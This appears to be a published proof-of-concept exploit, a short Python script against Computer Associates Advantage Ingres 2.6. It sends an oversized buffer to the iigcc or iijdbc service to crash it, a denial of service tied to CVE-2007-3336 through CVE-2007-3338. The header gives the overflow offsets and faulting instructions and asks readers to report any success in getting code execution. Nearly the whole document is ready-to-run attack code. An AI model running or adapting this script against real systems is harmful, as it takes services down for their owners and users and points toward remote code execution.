# Exploit Title: Computer Associates Advantage Ingres 2.6 Denial of Service Vulnerabilities
# Date: 2010-08-14
# Author: fdisk
# Version: 2.6
# Tested on: Windows 2003 Server SP1 en
# CVE: CVE-2007-3336 - CVE-2007-3338
# Notes: Fixed in the last version.
# iigcc - EDX holds a pointer that's overwritten at byte 2106 and it crashes while executing
# MOV EAX,DWORD PTR DS:[EDX+8]
# iijdbc - EDI holds a pointer that's overwritten at byte 1066 and it crashes while executing 
# CMP ECX,DWORD PTR DS:[EDI+4]
# please let me know if you are/were able to get code execution <rr dot fdisk at gmail dot com>

import socket
import sys

if len(sys.argv) != 4:
    print "Usage: ./CAAdvantageDoS.py <Target IP> <Port> <Service>"
    print "Vulnerable Services: iigcc, iijdbc"
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
service = sys.argv[3]

if service == "iigcc":
        payload = "\x41" * 2106
elif service == "iijdbc":
        payload = "\x41" * 1066
else:
        print "Vulnerable Services: iigcc, iijdbc"
        sys.exit(1)

payload += "\x42" * 4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "Sending payload"
s.send(payload)
data = s.recv(1024)
s.close()
print 'Received', repr(data)

print service + " crashed"
